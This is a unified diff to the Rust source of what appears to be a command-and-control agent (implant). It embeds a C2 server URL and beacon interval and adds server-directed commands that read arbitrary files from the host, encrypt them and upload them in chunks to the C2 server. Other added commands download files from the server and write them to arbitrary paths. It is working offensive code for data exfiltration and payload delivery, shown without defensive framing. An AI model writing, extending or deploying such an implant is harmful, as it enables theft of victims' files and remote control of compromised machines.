@@ -11,6 +11,8 @@ use sysinfo::System;
 mod system_info;
 mod auth;
 mod crypto;
+mod config;
+mod file_transfer;
 
 /// Default polling interval until the server assigns one.
 const DEFAULT_BEACON_INTERVAL_SECS: u64 = 30;
@@ -77,6 +79,14 @@ fn default_beacon_interval() -> u64 {
         .ok()
         .and_then(|v| v.parse().ok())
         .filter(|&v| v >= MIN_BEACON_INTERVAL_SECS && v <= MAX_BEACON_INTERVAL_SECS)
+        .or_else(|| {
+            let embedded = config::embedded_beacon_interval();
+            if embedded >= MIN_BEACON_INTERVAL_SECS && embedded <= MAX_BEACON_INTERVAL_SECS {
+                Some(embedded)
+            } else {
+                None
+            }
+        })
         .unwrap_or(DEFAULT_BEACON_INTERVAL_SECS)
 }
 
@@ -92,7 +102,7 @@ async fn main() {
     println!("Host: {}, OS: {}", hostname, os);
 
     let server_url = std::env::var("C2_SERVER_URL")
-        .unwrap_or_else(|_| "https://localhost:3443".to_string());
+        .unwrap_or_else(|_| config::embedded_server_url().to_string());
 
     let auth_token = auth::compute_agent_token(&agent_id);
     let psk = auth::get_psk();
@@ -271,6 +281,8 @@ async fn execute_command(
                 "Invalid sleep payload — use seconds as integer".to_string()
             }
         }
+        "file_download" => handle_file_download(client, server_url, agent_id, auth_token, session_key, &cmd).await,
+        "file_upload" => handle_file_upload(client, server_url, agent_id, auth_token, session_key, &cmd).await,
         _ => format!("Unknown command type: {}", cmd.command_type),
     };
 
@@ -324,6 +336,168 @@ async fn execute_command(
             }
         }
         Err(e) => eprintln!("Failed to send result: {}", e),
+    }
+}
+
+#[derive(Deserialize)]
+struct FileDownloadPayload {
+    transfer_id: String,
+    file_path: String,
+}
+
+#[derive(Deserialize)]
+struct FileUploadPayload {
+    transfer_id: String,
+    dest_path: String,
+    chunks_total: usize,
+    checksum: String,
+}
+
+/// Agent reads a local file and uploads chunks to the C2 server.
+async fn handle_file_download(
+    client: &Client,
+    server_url: &str,
+    agent_id: &str,
+    auth_token: &str,
+    session_key: Option<&[u8; 32]>,
+    cmd: &PendingCommand,
+) -> String {
+    let params: FileDownloadPayload = match serde_json::from_str(&cmd.payload) {
+        Ok(p) => p,
+        Err(e) => return format!("Invalid file_download payload: {}", e),
+    };
+
+    let chunks = match file_transfer::read_file_chunks(&params.file_path) {
+        Ok(c) => c,
+        Err(e) => return format!("Failed to read file: {}", e),
+    };
+
+    let psk_key = crypto::derive_key_from_psk(&auth::get_psk());
+    let encrypt_key = session_key.unwrap_or(&psk_key);
+
+    for chunk in &chunks {
+        let body = json!({
+            "transfer_id": params.transfer_id,
+            "agent_id": agent_id,
+            "chunk_index": chunk.chunk_index,
+            "chunks_total": chunks.len(),
+            "data_b64": chunk.data_b64,
+            "checksum": chunk.checksum,
+        });
+
+        let payload_bytes = match serde_json::to_vec(&body) {
+            Ok(b) => b,
+            Err(e) => return format!("Serialize chunk failed: {}", e),
+        };
+        let encrypted = match crypto::encrypt(&payload_bytes, encrypt_key) {
+            Ok(e) => e,
+            Err(e) => return format!("Encrypt chunk failed: {}", e),
+        };
+
+        let url = format!("{}/api/files/chunk", server_url.trim_end_matches('/'));
+        match client
+            .post(&url)
+            .header("Authorization", format!("Bearer {}", auth_token))
+            .header("X-Agent-Id", agent_id)
+            .json(&EncryptedEnvelope { payload: encrypted })
+            .send()
+            .await
+        {
+            Ok(resp) if resp.status().is_success() => {}
+            Ok(resp) => return format!("Chunk upload failed: HTTP {}", resp.status()),
+            Err(e) => return format!("Chunk upload error: {}", e),
+        }
+    }
+
+    format!(
+        "Uploaded {} chunks for transfer {} from {}",
+        chunks.len(),
+        params.transfer_id,
+        params.file_path
+    )
+}
+
+/// Agent pulls file chunks from the server and writes to disk.
+async fn handle_file_upload(
+    client: &Client,
+    server_url: &str,
+    agent_id: &str,
+    auth_token: &str,
+    session_key: Option<&[u8; 32]>,
+    cmd: &PendingCommand,
+) -> String {
+    let params: FileUploadPayload = match serde_json::from_str(&cmd.payload) {
+        Ok(p) => p,
+        Err(e) => return format!("Invalid file_upload payload: {}", e),
+    };
+
+    let psk_key = crypto::derive_key_from_psk(&auth::get_psk());
+    let encrypt_key = session_key.unwrap_or(&psk_key);
+
+    for index in 0..params.chunks_total {
+        let url = format!(
+            "{}/api/files/{}/chunks/{}",
+            server_url.trim_end_matches('/'),
+            params.transfer_id,
+            index
+        );
+
+        let resp = match client
+            .get(&url)
+            .header("Authorization", format!("Bearer {}", auth_token))
+            .header("X-Agent-Id", agent_id)
+            .send()
+            .await
+        {
+            Ok(r) => r,
+            Err(e) => return format!("Failed to fetch chunk {}: {}", index, e),
+        };
+
+        if !resp.status().is_success() {
+            return format!("Chunk {} fetch failed: HTTP {}", index, resp.status());
+        }
+
+        let envelope: EncryptedResponse = match resp.json().await {
+            Ok(e) => e,
+            Err(e) => return format!("Invalid chunk response: {}", e),
+        };
+
+        let plaintext = match crypto::decrypt(&envelope.payload, encrypt_key) {
+            Ok(p) => p,
+            Err(e) => return format!("Decrypt chunk failed: {}", e),
+        };
+
+        #[derive(Deserialize)]
+        struct ChunkData {
+            data_b64: String,
+            checksum: String,
+        }
+
+        let chunk: ChunkData = match serde_json::from_slice(&plaintext) {
+            Ok(c) => c,
+            Err(e) => return format!("Parse chunk failed: {}", e),
+        };
+
+        if let Err(e) = file_transfer::write_file_chunk(
+            &params.dest_path,
+            index,
+            &chunk.data_b64,
+            &chunk.checksum,
+        ) {
+            return format!("Write chunk {} failed: {}", index, e);
+        }
+    }
+
+    match file_transfer::verify_file_checksum(&params.dest_path, &params.checksum) {
+        Ok(true) => format!(
+            "File saved to {} ({} chunks verified)",
+            params.dest_path, params.chunks_total
+        ),
+        Ok(false) => format!(
+            "File assembled but checksum mismatch at {}",
+            params.dest_path
+        ),
+        Err(e) => format!("Checksum verification error: {}", e),
     }
 }
 
